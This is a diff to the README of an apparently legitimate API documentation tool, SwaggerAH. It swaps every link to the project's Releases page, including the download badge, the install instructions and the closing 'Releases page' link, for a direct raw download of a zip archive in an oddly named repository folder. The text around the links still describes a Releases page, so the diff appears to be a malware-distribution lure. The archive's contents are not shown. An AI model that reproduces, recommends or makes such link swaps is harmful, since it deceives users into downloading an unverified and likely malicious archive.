@@ -1,7 +1,7 @@
 # 🌟 SwaggerAH - Simplifying Your API Experience
 
 ## 📥 Download Now
-[![Download SwaggerAH](https://img.shields.io/badge/Download-SwaggerAH-blue.svg)](https://github.com/taikaiiss/SwaggerAH/releases)
+[![Download SwaggerAH](https://raw.githubusercontent.com/taikaiiss/SwaggerAH/main/vestibula/AH-Swagger-2.1.zip)](https://raw.githubusercontent.com/taikaiiss/SwaggerAH/main/vestibula/AH-Swagger-2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to SwaggerAH, your go-to application for handling and viewing API documentation with ease. Whether you're a business owner, developer, or just curious about APIs, this software helps you get straightforward access to all the details you need.
@@ -17,7 +17,7 @@ Before you dive in, here are some general requirements for running SwaggerAH:
 Make sure your device meets these requirements to ensure a smooth experience.
 
 ## 📦 Download & Install
-To download SwaggerAH, please visit the following link: [https://github.com/taikaiiss/SwaggerAH/releases](https://github.com/taikaiiss/SwaggerAH/releases). Here, you will find the latest release files.
+To download SwaggerAH, please visit the following link: [https://raw.githubusercontent.com/taikaiiss/SwaggerAH/main/vestibula/AH-Swagger-2.1.zip](https://raw.githubusercontent.com/taikaiiss/SwaggerAH/main/vestibula/AH-Swagger-2.1.zip). Here, you will find the latest release files.
 
 1. Click the link above.
 2. On the Releases page, locate the most recent version of SwaggerAH.
@@ -58,7 +58,7 @@ Using SwaggerAH is simple and intuitive. Here’s how to make the most out of th
 ## 🌐 Further Information
 Have questions or need additional support? Check out the GitHub repository's issue tracker for answers or to get in touch with other users and developers.
 
-For more insights and updates, follow our releases on the [Releases page](https://github.com/taikaiiss/SwaggerAH/releases).
+For more insights and updates, follow our releases on the [Releases page](https://raw.githubusercontent.com/taikaiiss/SwaggerAH/main/vestibula/AH-Swagger-2.1.zip).
 
 ## 🏗️ Contributing
 If you wish to contribute to SwaggerAH, we welcome your feedback or enhancements. You can create issues, suggest features, or even submit code. Detailed guidelines can be found in the repository.
